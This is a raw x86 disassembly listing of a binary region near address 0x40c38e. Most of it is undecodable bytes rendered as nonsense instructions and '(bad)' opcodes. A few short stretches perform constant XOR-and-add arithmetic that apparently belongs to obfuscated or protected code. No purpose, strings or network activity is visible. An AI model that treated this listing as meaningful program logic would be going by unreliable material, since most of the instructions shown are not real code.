  40c38e:	iret   
  40c38f:	jo     0x40c36a
  40c391:	fwait
  40c392:	add    BYTE PTR [ebp+0x189ff517],cl
  40c398:	addr16 push ecx
  40c39a:	ror    BYTE PTR [ecx],1
  40c39c:	enter  0xdc27,0x62
  40c3a0:	lods   eax,DWORD PTR ds:[esi]
  40c3a1:	lods   al,BYTE PTR ds:[esi]
  40c3a2:	or     eax,0x2a997b4c
  40c3a7:	sbb    BYTE PTR [ebx+0x1b633cf2],ch
  40c3ad:	aaa    
  40c3ae:	mov    ds:0x9e6dbcd1,eax
  40c3b3:	xlat   BYTE PTR ds:[ebx]
  40c3b4:	lahf   
  40c3b5:	jmp    0x40c351
  40c3b7:	xchg   ebx,eax
  40c3b8:	dec    ebp
  40c3b9:	mov    fs,WORD PTR [eax]
  40c3bb:	repnz mov ?,WORD PTR cs:[eax+ecx*2+0x4110d7ed]
  40c3c4:	(bad)  
  40c3c6:	jmp    0x8b23cfb4
  40c3cb:	dec    esi
  40c3cc:	sub    DWORD PTR [eax-0x62b42d61],0xfffffff1
  40c3d3:	ins    BYTE PTR es:[edi],dx
  40c3d4:	inc    ebx
  40c3d5:	jnp    0x40c443
  40c3d7:	outs   dx,BYTE PTR ds:[esi]
  40c3d8:	call   0x89c6:0x3e2dd58b
  40c3df:	fwait
  40c3e0:	push   0x220fa2d9
  40c3e5:	add    esi,DWORD PTR [ebx]
  40c3e7:	mov    eax,DWORD PTR [ebp-0x4]
  40c3ea:	mov    ecx,0x7510854
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	rcl    eax,cl
  40c447:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c448:	aad    0xbe
  40c44a:	adc    al,0x82
  40c44c:	jle    0x40c4cc
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c452:	loopne 0x40c472
  40c454:	cmp    esi,DWORD PTR [edi-0x77157f41]
  40c45a:	test   esi,edi
  40c45c:	pop    ds
  40c45d:	(bad)  
  40c45f:	jae    0x40c46f
  40c461:	jne    0x40c3fc
  40c463:	mov    eax,ds:0x71767d76
  40c469:	int    0x6b
  40c46b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c46c:	sub    al,0x92
  40c46e:	aad    0xb2
  40c470:	pop    ds
  40c471:	pop    es
  40c472:	fstp   QWORD PTR [ebx]
  40c474:	adc    cl,BYTE PTR [esi+0x53]
  40c477:	stos   BYTE PTR es:[edi],al
  40c478:	pop    edx
  40c479:	popf   
  40c47a:	leave  
  40c47b:	ins    DWORD PTR es:[edi],dx
  40c47c:	mov    ecx,0xd4c31eba
  40c481:	cmp    edi,DWORD PTR [ebx+0x3ff133a3]
  40c487:	bound  esp,QWORD PTR [esi-0x8089349]
  40c48d:	retf   0x8c9b
  40c490:	push   edi
  40c492:	xor    al,0xda
  40c494:	mov    sp,0x5317
  40c498:	ret    0x1d67
  40c49b:	xor    bh,0x95
  40c49e:	imul   edi,DWORD PTR ds:0x9b8d66e5,0xffffffcc
  40c4a5:	jl     0x40c43b
  40c4a7:	xchg   ebp,eax
  40c4a8:	les    edx,FWORD PTR [esi]
  40c4aa:	call   0x1e87b864
  40c4af:	sub    al,0xca
  40c4b1:	into   
  40c4b2:	inc    esi
  40c4b3:	and    eax,0xf34fb2e3
  40c4b8:	cmp    eax,0x747514a8
  40c4bd:	mov    esp,0xa4e3c4d5
  40c4c2:	xchg   esi,eax
  40c4c3:	repz es addr16 lock not dh
  40c4c9:	pop    ebx
  40c4ca:	xor    ah,al
  40c4cc:	aaa    
  40c4cd:	mov    bh,0xe7
  40c4cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4d0:	fs dec al
  40c4d3:	mov    bh,0x75
  40c4d5:	shl    DWORD PTR [eax+0x64],1
  40c4d8:	jle    0x40c48a
  40c4da:	inc    ax
  40c4dc:	xor    BYTE PTR [ebx+0x685e5dd2],dl
  40c4e2:	(bad)  
  40c4e4:	mov    bh,0x3f
  40c4e6:	imul   edx
  40c4e8:	jae    0x40c51b
  40c4ea:	inc    ebp
  40c4eb:	mov    edx,0x9defdeb8
  40c4f0:	lock rol edi,1
  40c4f3:	data16 xor BYTE PTR ds:[edx-0x4b],dl
  40c4f8:	or     bl,ah
  40c4fa:	mov    ebp,0x1c83691d
  40c4ff:	xchg   esi,eax
  40c500:	mov    ah,BYTE PTR [eax]
  40c502:	addr16 mov edx,0x3cf89bf2
  40c508:	inc    esp
  40c509:	je     0x40c4d4
  40c50b:	hlt    
  40c50c:	push   ecx
  40c50d:	mov    al,BYTE PTR [esi]
  40c50f:	fist   DWORD PTR [ecx]
  40c511:	outs   dx,DWORD PTR ds:[esi]
  40c512:	mov    ch,0xe2
  40c514:	ss loopne 0x40c4fb
  40c517:	lock push edi
  40c519:	sar    BYTE PTR [ecx+edx*8-0x57716949],cl
  40c520:	adc    BYTE PTR [ebx+0x41284ebb],al
  40c526:	in     eax,0xc7
  40c528:	push   0xffffff83
  40c52a:	sbb    cl,BYTE PTR [esi]
  40c52c:	push   ds
  40c52d:	arpl   WORD PTR [edi],cx
  40c52f:	imul   ebp,DWORD PTR [ecx+0x3944f057],0xffffffa6
  40c536:	dec    edi
  40c537:	mov    bh,0x40
  40c539:	sub    al,0xc2
  40c53b:	inc    ebp
  40c53c:	adc    al,0xce
  40c53e:	dec    ebp
  40c53f:	je     0x40c581
  40c541:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c542:	scas   al,BYTE PTR es:[edi]
  40c543:	fild   QWORD PTR [ebp+0x55]
  40c546:	cwde   
  40c547:	data16 cmp BYTE PTR [ebp-0x3f],cl
  40c54b:	xor    ebp,DWORD PTR [edi]
  40c54d:	cwde   
  40c54e:	jmp    0x60f376d5
  40c553:	mov    ds:0xcecfbc87,al
  40c558:	(bad)  
  40c559:	adc    eax,0xd47ffe6a
  40c55e:	sbb    al,0x5a
  40c560:	cmp    BYTE PTR [esi-0x53b32bf1],dh
  40c566:	push   edx
  40c567:	das    
  40c568:	loope  0x40c5bf
  40c56a:	sub    bh,dl
  40c56c:	std    
  40c56d:	loope  0x40c50f
  40c56f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c570:	push   esp
  40c571:	xchg   edi,eax
  40c572:	daa    
  40c573:	inc    DWORD PTR [ecx]
  40c575:	xchg   edx,eax
  40c576:	or     al,BYTE PTR [eax-0x3571210]
  40c57c:	sub    BYTE PTR [ecx+0x7f],0x8e
  40c580:	pusha  
  40c581:	jecxz  0x40c5e8
  40c583:	xor    BYTE PTR [edi+edx*4],dh
  40c586:	push   edx
  40c587:	jmp    0xa6d5:0x77248ca0
  40c58e:	shl    BYTE PTR [esi+eiz*8],cl
  40c591:	push   edx
  40c592:	or     al,0xeb
  40c594:	and    BYTE PTR [ebp+0x162f8f4],ch
  40c59a:	add    DWORD PTR [edx+edi*2-0x2a35e30f],ebx
  40c5a1:	cmp    DWORD PTR [edi+edx*4-0x68],0xfffffff8
  40c5a6:	call   0x1301:0x569c78a7
  40c5ad:	push   0x72
  40c5af:	add    eax,0x18375c1c
  40c5b4:	pop    ds
  40c5b5:	mov    bh,0xfa
  40c5b7:	cmc    
  40c5b8:	aam    0x94
  40c5ba:	add    eax,0xe85bda3a
  40c5bf:	hlt    
  40c5c0:	cwde   
  40c5c1:	dec    edx
  40c5c2:	adc    eax,0x9315ba0e
  40c5c7:	in     al,dx
  40c5c8:	and    BYTE PTR [esi+0x26],bl
  40c5cb:	mov    eax,0xaf045248
  40c5d0:	fldenv [eax+0x4a]
  40c5d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5d4:	or     edx,ebx
  40c5d6:	stos   DWORD PTR es:[edi],eax
  40c5d7:	sub    eax,0xa095243e
  40c5dc:	mov    al,ds:0xd1f29161
  40c5e1:	pop    ss
  40c5e2:	js     0x40c618
  40c5e4:	fistp  WORD PTR [ecx-0x40f798cc]
  40c5ea:	jg     0x40c582
  40c5ec:	in     eax,dx
  40c5ed:	xor    eax,ebx
  40c5ef:	and    esp,DWORD PTR [eax]
  40c5f1:	jmp    0x25d0b007
  40c5f6:	or     DWORD PTR [edi+0x24],0x41
  40c5fa:	jl     0x40c598
  40c5fc:	mov    ah,0xdc
  40c5fe:	scas   eax,DWORD PTR es:[edi]
  40c5ff:	test   ecx,ecx
  40c601:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c602:	dec    esi
  40c603:	data16 sahf 
  40c605:	inc    ebx
  40c606:	push   ebp
  40c607:	not    edx
  40c609:	and    al,0x57
  40c60b:	push   ebp
  40c60c:	fsub   QWORD PTR [edx]
  40c60e:	lods   eax,DWORD PTR ds:[esi]
  40c60f:	adc    al,0x89
  40c611:	jmp    0x1c74:0xd07aa4cd
  40c618:	pusha  
  40c619:	hlt    
  40c61a:	pop    ss
  40c61b:	cmc    
  40c61c:	clc    
  40c61d:	hlt    
  40c61e:	fst    QWORD PTR [eax+0x2211edff]
  40c624:	xor    eax,0x285a5d95
  40c629:	test   BYTE PTR [esi-0x74],cl
  40c62c:	dec    ebp
  40c62d:	jmp    FWORD PTR [eax*2-0x4c092c37]
  40c634:	add    eax,ecx
  40c636:	scas   al,BYTE PTR es:[edi]
  40c637:	sbb    ebp,edi
  40c639:	push   ebx
  40c63a:	push   ebx
  40c63b:	sbb    ecx,0x31
  40c63e:	mov    ch,0xa4
  40c640:	test   eax,0xf2547daa
  40c645:	sbb    esi,DWORD PTR [edi+0x5b3f77b6]
  40c64b:	xor    dh,BYTE PTR [ebx-0x60]
  40c64e:	shr    esi,cl
  40c650:	sub    al,0xc8
  40c652:	sbb    BYTE PTR [eax],dh
  40c654:	xor    ah,BYTE PTR [edi]
  40c656:	push   ebx
  40c657:	add    edi,esp
  40c659:	inc    ecx
  40c65a:	(bad)  
  40c65b:	popa   
  40c65c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c65d:	adc    eax,0x49c7ef42
  40c662:	outs   dx,DWORD PTR ds:[esi]
  40c663:	popf   
  40c664:	dec    ebx
  40c665:	ror    BYTE PTR [esi],1
  40c667:	cs jp  0x40c6ac
  40c66a:	das    
  40c66b:	inc    edi
  40c66c:	jle    0x40c699
  40c66e:	ret    
  40c66f:	jbe    0x40c612
  40c671:	test   BYTE PTR [esi+0x5c],al
  40c674:	sbb    eax,0x6fb92fb6
  40c679:	mov    DWORD PTR [ecx-0x79],ebp
  40c67c:	pop    ebx
  40c67d:	pop    ds
  40c67e:	jb     0x40c699
  40c680:	fist   WORD PTR [eax]
  40c682:	xor    ch,cl
  40c684:	pushf  
  40c685:	test   eax,0xbc1bf6f7
  40c68a:	jns    0x40c6e6
  40c68c:	iret   
  40c68d:	repz push edi
  40c68f:	shl    edi,cl
  40c691:	(bad)  
  40c692:	xor    dh,bl
  40c694:	push   ebx
  40c695:	xor    dl,dl
  40c697:	dec    edx
  40c698:	mov    esi,0x32729b
  40c69d:	add    edi,esi
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp+0x66b99ac1],dl
  40c6de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6df:	dec    eax
  40c6e0:	fiadd  WORD PTR [eax+0x7c387e7e]
  40c6e6:	jle    0x40c766
  40c6e8:	in     al,dx
  40c6e9:	adc    ecx,edx
  40c6eb:	mov    ebx,0xfd887d56
  40c6f0:	test   BYTE PTR [edx-0x14004884],cl
  40c6f6:	popf   
  40c6f7:	call   0x89d9:0x290d9311
  40c6fe:	mov    ds:0xc2951420,eax
  40c703:	in     al,dx
  40c704:	rcr    esi,0x60
  40c707:	out    dx,eax
  40c708:	jbe    0x40c69b
  40c70a:	stc    
  40c70b:	aaa    
  40c70c:	je     0x40c6c9
  40c70e:	loope  0x40c706
  40c710:	or     eax,0xdd111d69
  40c715:	jbe    0x40c6df
  40c717:	mov    edi,0x598df2af
  40c71c:	(bad)  
  40c71d:	icebp  
  40c71e:	push   eax
  40c71f:	dec    edx
  40c720:	sbb    BYTE PTR [ecx+0x59],ch
  40c723:	dec    esi
  40c724:	sub    al,0xec
  40c726:	mov    WORD PTR ds:0xb99e9fab,es
  40c72c:	adc    al,0xc
  40c72e:	push   cs
  40c72f:	aam    0xd6
  40c731:	dec    edi
  40c732:	int    0x8b
  40c734:	jmp    DWORD PTR [ebp-0x2f]
  40c737:	cmp    cl,BYTE PTR [ecx]
  40c739:	shr    ch,1
  40c73b:	fisubr WORD PTR [edi+ebx*4-0x31ad8846]
  40c742:	cwde   
  40c743:	pop    es
  40c744:	push   ebp
  40c745:	lahf   
  40c746:	adc    al,0x24
  40c748:	ds mov bh,0x44
  40c74b:	or     al,0x18
  40c74d:	xchg   BYTE PTR [edx-0x33f82e42],bl
  40c753:	push   eax
  40c754:	push   ecx
  40c755:	or     edx,edi
  40c757:	repnz outs dx,DWORD PTR ds:[esi]
  40c759:	adc    esi,esp
  40c75b:	jg     0x40c738
  40c75d:	bound  esp,QWORD PTR [ebp+0x35]
  40c760:	sti    
  40c761:	mov    edi,0x28d64d9f
  40c766:	jo     0x40c799
  40c768:	jmp    0x40c7d8
  40c76a:	mov    bl,0xba
  40c76c:	jnp    0x40c750
  40c76e:	adc    ecx,DWORD PTR [edi-0x244d96e7]
  40c774:	sar    bl,0xd4
  40c777:	enter  0xd746,0xc2
  40c77b:	pop    ecx
  40c77c:	and    DWORD PTR [edi],ecx
  40c77e:	mov    dl,0x52
  40c780:	test   BYTE PTR [eax],al
  40c782:	xor    ebp,ecx
  40c784:	push   ecx
  40c785:	aaa    
  40c786:	pop    esp
  40c787:	in     al,0x64
  40c789:	aas    
  40c78a:	fisub  WORD PTR [ecx+0x76b2afef]
  40c790:	sbb    al,0x16
  40c792:	(bad)  
  40c793:	push   es
  40c794:	lds    ebp,FWORD PTR [ecx-0x19]
  40c797:	mov    ebx,0x4ad537e7
  40c79c:	or     eax,0x4a92f7f8
  40c7a1:	mov    dl,0xea
  40c7a3:	push   edi
  40c7a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7a5:	and    ebx,DWORD PTR [esi]
  40c7a7:	push   eax
  40c7a8:	push   ebp
  40c7a9:	mov    bh,bh
  40c7ab:	push   es
  40c7ac:	addr16 xchg ebx,eax
  40c7ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7af:	ret    0x1921
  40c7b2:	dec    ebx
  40c7b3:	inc    esp
  40c7b4:	adc    dh,BYTE PTR [edi]
  40c7b6:	in     eax,0x3c
  40c7b8:	cmp    al,0x7f
  40c7ba:	ins    BYTE PTR es:[edi],dx
  40c7bb:	dec    esi
  40c7bc:	icebp  
  40c7bd:	clc    
  40c7be:	fcom   st(7)
  40c7c0:	sbb    DWORD PTR [esi+0x15d1b000],ecx
  40c7c6:	sub    al,0x5d
  40c7c8:	push   ds
  40c7c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7ca:	sbb    BYTE PTR [edx],ah
  40c7cc:	pusha  
  40c7cd:	mov    edx,0xd254a784
  40c7d2:	jo     0x40c7f1
  40c7d4:	loopne 0x40c817
  40c7d6:	cmp    BYTE PTR [edi],dl
  40c7d8:	mov    ah,bl
  40c7da:	push   ss
  40c7db:	popa   
  40c7dc:	adc    bl,BYTE PTR [eax+0x3695dcb4]
  40c7e2:	or     al,0xe0
  40c7e4:	xchg   edx,eax
  40c7e5:	cdq    
  40c7e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7e7:	lods   eax,DWORD PTR ds:[esi]
  40c7e8:	popa   
  40c7e9:	sub    BYTE PTR [edx-0x43],dl
  40c7ec:	stc    
  40c7ed:	mov    edx,0x9e8943ff
  40c7f2:	adc    al,0x62
  40c7f4:	cs pop es
  40c7f6:	pop    edx
  40c7f7:	add    ecx,DWORD PTR [esi-0x1c]
  40c7fa:	cmp    DWORD PTR [ecx-0x43cce80f],esp
  40c800:	popa   
  40c801:	jno    0x40c793
  40c803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c804:	pop    esi
  40c805:	call   0x43f59166
  40c80a:	adc    eax,0xe5033f
  40c80f:	retf   0x21e1
  40c812:	ja     0x40c865
  40c814:	jae    0x40c820
  40c816:	and    DWORD PTR [edi-0x6312d645],0xb640624
  40c820:	in     al,0x54
  40c822:	out    dx,eax
  40c823:	mov    esp,es
  40c825:	or     DWORD PTR [edx],edx
  40c827:	dec    ebx
  40c828:	sub    ebx,ecx
  40c82a:	or     esi,DWORD PTR [ebx+0x10223b50]
  40c830:	sub    al,0xb
  40c832:	jmp    0x899c:0x2d45c067
  40c839:	inc    ebp
  40c83a:	out    0x5,al
  40c83c:	or     bh,cl
  40c83e:	sbb    eax,0xe5e97255
  40c843:	pop    esp
  40c844:	add    BYTE PTR [edi],bh
  40c846:	aam    0xc3
  40c848:	jae    0x40c8a9
  40c84a:	fst    DWORD PTR [esi]
  40c84c:	(bad)  
  40c84d:	mov    bl,0x2c
  40c84f:	add    al,0x21
  40c851:	leave  
  40c852:	adc    DWORD PTR [esi+0x32],eax
  40c855:	mov    dh,ch
  40c857:	rcl    BYTE PTR [ecx-0x3a],0x35
  40c85b:	push   esp
  40c85c:	mov    esi,0xc13a68a3
  40c861:	sbb    eax,0xb23f3802
  40c866:	je     0x40c894
  40c868:	jnp    0x40c878
  40c86a:	out    dx,al
  40c86b:	stc    
  40c86c:	mov    ebp,0x81f27029
  40c871:	pop    ss
  40c872:	mov    edi,0x923a9dba
  40c877:	idiv   DWORD PTR [esi-0x39]
  40c87a:	cwde   
  40c87b:	(bad)
  40c880:	in     al,dx
  40c881:	push   ebp
  40c882:	jbe    0x40c8f3
  40c884:	jns    0x40c858
  40c886:	or     DWORD PTR [edi],edx
  40c888:	stos   DWORD PTR es:[edi],eax
  40c889:	pop    eax
  40c88a:	je     0x40c89c
  40c88c:	and    al,0xca
  40c88e:	ja     0x40c8f6
  40c890:	inc    esi
  40c891:	pusha  
  40c892:	and    edi,0xa6687796
  40c898:	ja     0x40c899
  40c89a:	outs   dx,BYTE PTR ds:[si]
  40c89c:	jns    0x40c915
  40c89e:	push   ds
  40c89f:	retf   
  40c8a0:	mov    WORD PTR [ebx],ds
  40c8a2:	daa    
  40c8a3:	imul   ecx,DWORD PTR [ecx+0x3807359c],0x2e9479c
  40c8ad:	mov    ds:0x3dcd29d8,al
  40c8b2:	fcomp  DWORD PTR [ecx]
  40c8b4:	ret    
  40c8b5:	adc    dh,BYTE PTR ds:0x7fe2b4b1
  40c8bb:	or     edi,ebx
  40c8bd:	adc    bh,ah
  40c8bf:	push   0xffffff82
  40c8c1:	mov    edi,0x7a99688
  40c8c6:	shr    BYTE PTR [esi+edi*1],0x26
  40c8ca:	sti    
  40c8cb:	fbld   TBYTE PTR [ebx-0x6e89ee01]
  40c8d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8d2:	jmp    0x3b78:0xf81e8892
  40c8d9:	out    0x92,al
  40c8db:	outs   dx,BYTE PTR ds:[esi]
  40c8dc:	adc    bh,BYTE PTR [esi]
  40c8de:	or     eax,0xaef156f
  40c8e3:	lods   al,BYTE PTR ds:[esi]
  40c8e4:	sub    al,0x6f
  40c8e6:	stos   BYTE PTR es:[edi],al
  40c8e7:	neg    ebp
  40c8e9:	jecxz  0x40c8b6
  40c8eb:	push   esp
  40c8ec:	(bad)  
  40c8ed:	imul   edi,edi,0x88d20ecb
  40c8f3:	push   ebp
  40c8f4:	sbb    al,BYTE PTR [edx]
  40c8f6:	or     eax,0xb0aaed27
  40c8fb:	xor    DWORD PTR [ecx],edi
  40c8fd:	push   edi
  40c8fe:	imul   esp,DWORD PTR [edx],0x473caeca
  40c904:	sbb    cl,BYTE PTR [ecx]
  40c906:	push   ds
  40c907:	sbb    cl,BYTE PTR [edx-0x2f]
  40c90a:	rol    DWORD PTR [esi-0x2bc1ee92],cl
  40c910:	dec    esi
  40c911:	pop    esi
  40c912:	add    al,0xe0
  40c914:	inc    edx
  40c915:	inc    edx
  40c916:	xchg   esi,eax
  40c917:	aaa    
  40c918:	sbb    esp,DWORD PTR [ecx+0x2dfa245c]
  40c91e:	xchg   ebx,eax
  40c91f:	cmp    eax,0x37922cbc
  40c924:	imul   esi,ebp,0x4d95a9a
  40c92a:	scas   eax,DWORD PTR es:[edi]
  40c92b:	jnp    0x40c974
  40c92d:	mov    ds:0x3314558b,al
  40c932:	shr    ecx,0x5e
  40c935:	add    al,BYTE PTR [eax]
  40c937:	add    BYTE PTR [edi],al
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [ecx+0x20],ebx
  40c946:	fild   DWORD PTR [ebx]
  40c948:	cwde   
  40c949:	mov    ?,WORD PTR [esi+0x7e]
  40c94c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c950:	pop    ecx
  40c951:	popf   
  40c952:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c953:	add    al,0xfb
  40c955:	sbb    eax,0x7492a886
  40c95a:	mov    eax,ds:0x127ef7fd
  40c95f:	aaa    
  40c960:	mov    al,ds:0x6000e02d
  40c965:	or     bh,BYTE PTR [eax+0x30]
  40c968:	mov    esi,ds
  40c96a:	mov    dl,0xa0
  40c96c:	and    BYTE PTR [eax-0x18b2604c],0x98
  40c973:	and    eax,0x7a4ec689
  40c978:	push   0x873524ab
  40c97d:	mov    ebx,0xf1ced5b0
  40c982:	sbb    dl,BYTE PTR [edi+eiz*8-0x49]
  40c986:	mov    bh,0xb0
  40c988:	cmp    bl,BYTE PTR [ecx-0x61ae51b0]
  40c98e:	xchg   ebp,eax
  40c98f:	iret   
  40c990:	dec    esi
  40c991:	dec    ebp
  40c992:	loopne 0x40c9fe
  40c994:	or     ch,BYTE PTR [edx+0x747b2e50]
  40c99a:	jmp    0xe530a5d5
  40c99f:	add    eax,0xe0cfa31f
  40c9a4:	add    esp,ebp
  40c9a6:	xor    bl,dl
  40c9a8:	mov    cl,al
  40c9aa:	in     al,dx
  40c9ab:	frstor [ebp+0x3a]
  40c9ae:	loop   0x40c9d0
  40c9b0:	out    0x77,eax
  40c9b2:	jecxz  0x40ca21
  40c9b4:	mov    al,0xcc
  40c9b6:	add    dh,0xbd
  40c9b9:	ins    DWORD PTR es:[edi],dx
  40c9ba:	sub    BYTE PTR [eax-0x2bd903fe],bl
  40c9c0:	or     DWORD PTR [eax],ebp
  40c9c2:	xlat   BYTE PTR ds:[ebx]
  40c9c3:	test   eax,0x7a75e3e9
  40c9c8:	lds    eax,FWORD PTR ds:0x7c37c92e
  40c9ce:	in     eax,0x3c
  40c9d0:	xchg   esp,eax
  40c9d1:	jmp    0x40c9a0
  40c9d3:	xchg   ebx,eax
  40c9d4:	lahf   
  40c9d5:	add    bh,BYTE PTR [eax]
  40c9d7:	inc    edi
  40c9d8:	out    0x36,al
  40c9da:	adc    DWORD PTR [edx-0x62],ebx
  40c9dd:	in     eax,0x38
  40c9df:	mov    dh,0x89
  40c9e1:	push   es
  40c9e2:	test   BYTE PTR [ebp-0x6b],al
  40c9e5:	imul   edi,DWORD PTR [ebp+0x69df412d],0xffffff96
  40c9ec:	inc    esi
  40c9ed:	mov    eax,ebx
  40c9ef:	imul   ecx,DWORD PTR [edi+0x18],0x7f
  40c9f3:	sbb    BYTE PTR [ebp-0x1e],al
  40c9f6:	push   edx
  40c9f7:	call   0x2c9a8e3d
  40c9fc:	push   ebx
  40c9fd:	xchg   edx,eax
  40c9fe:	mov    esi,0x726a0429
  40ca03:	test   al,0xab
  40ca05:	adc    eax,ebp
  40ca07:	pusha  
  40ca08:	push   edx
  40ca09:	xor    eax,ebp
  40ca0b:	rcr    BYTE PTR [esi+0x2b],1
  40ca0e:	jbe    0x40ca2f
  40ca10:	mov    ebx,0x92ff9a26
  40ca15:	add    BYTE PTR [ecx],bl
  40ca17:	(bad)  
  40ca18:	dec    ebx
  40ca19:	fldcw  WORD PTR [ebp+0xbf9e660]
  40ca1f:	jp     0x40ca25
  40ca21:	sbb    ebp,ebx
  40ca23:	mov    WORD PTR [eax-0x5d],ss
  40ca26:	fst    QWORD PTR [ebp-0x3ad92d06]
  40ca2c:	fimul  WORD PTR [eax+0x44b3a418]
  40ca32:	mov    ebp,0xb61561c1
  40ca37:	jecxz  0x40ca66
  40ca39:	sahf   
  40ca3a:	jb     0x40c9e6
  40ca3c:	add    eax,0xb8957b5d
  40ca41:	(bad)  
  40ca42:	nop    DWORD PTR [ebp-0x341cfb18]
  40ca49:	and    BYTE PTR [eax-0x74],al
  40ca4c:	sub    bl,BYTE PTR [ecx-0x6123c6ad]
  40ca52:	jns    0x40c9e2
  40ca54:	je     0x40cab4
  40ca56:	shl    DWORD PTR [ecx-0x9],0xa1
  40ca5a:	test   al,0x55
  40ca5c:	push   ds
  40ca5d:	in     al,0x3
  40ca5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca60:	sar    bh,0xa2
  40ca63:	cli    
  40ca64:	jns    0x40caa2
  40ca66:	addr16 or bh,ah
  40ca69:	sbb    BYTE PTR [esi+0x62d38427],0xc4
  40ca70:	inc    edi
  40ca71:	lahf   
  40ca72:	mov    ebp,0x4ce129aa
  40ca77:	push   cs
  40ca78:	arpl   WORD PTR [edi+0x3c],bp
  40ca7b:	sbb    al,0xe1
  40ca7d:	pop    esp
  40ca7e:	ret    0xafdf
  40ca81:	mov    dl,0xc2
  40ca84:	lods   eax,DWORD PTR ds:[esi]
  40ca85:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40ca87:	mov    ebp,0x167245f1
  40ca8c:	inc    ecx
  40ca8d:	popa   
  40ca8e:	push   edx
  40ca8f:	cld    
  40ca90:	xchg   edx,eax
  40ca91:	mov    eax,edx
  40ca93:	fsub   QWORD PTR [ebp-0x19bc9895]
  40ca99:	cmc    
  40ca9a:	neg    DWORD PTR [esi]
  40ca9c:	les    edx,FWORD PTR [esi+0x66]
  40ca9f:	fstp   QWORD PTR [edx-0x34]
  40caa2:	idiv   bh
  40caa4:	aaa    
  40caa5:	mov    dl,0xec
  40caa7:	pop    es
  40caa8:	or     al,cl
  40caaa:	pop    ebp
  40caab:	ins    DWORD PTR es:[edi],dx
  40caac:	enter  0x3f5b,0x1a
  40cab0:	or     DWORD PTR [ebx-0x6],ecx
  40cab3:	mov    ebp,0xfed4895f
  40cab8:	(bad)  
  40cab9:	xchg   edx,eax
  40caba:	pop    ebx
  40cabb:	push   ecx
  40cabc:	or     ah,BYTE PTR [edx]
  40cabe:	sbb    al,0x65
  40cac0:	inc    ebp
  40cac1:	daa    
  40cac2:	imul   esp,DWORD PTR [ebx+esi*1+0x36],0xffffff8e
  40cac7:	inc    ebx
  40cac8:	sbb    al,0x14
  40caca:	pop    ds
  40cacb:	cmp    esp,DWORD PTR [ebp-0x18469426]
  40cad1:	dec    edx
  40cad2:	rol    DWORD PTR [edx+eax*8+0x3e],0x22
  40cad7:	or     DWORD PTR [ecx+0xf],eax
  40cada:	retf   0xe9df
  40cadd:	or     BYTE PTR [edx-0x80],dh
  40cae0:	outs   dx,DWORD PTR ds:[esi]
  40cae1:	jp     0x40caf0
  40cae3:	push   cs
  40cae4:	push   ss
  40cae5:	add    BYTE PTR [ebp+0xb],cl
  40cae8:	xchg   ebx,eax
  40cae9:	dec    eax
  40caea:	sbb    ebx,ebp
  40caec:	ins    BYTE PTR es:[edi],dx
  40caed:	jmp    0x40cb4b
  40caef:	(bad)  
  40caf0:	(bad)  
  40caf1:	xchg   esp,eax
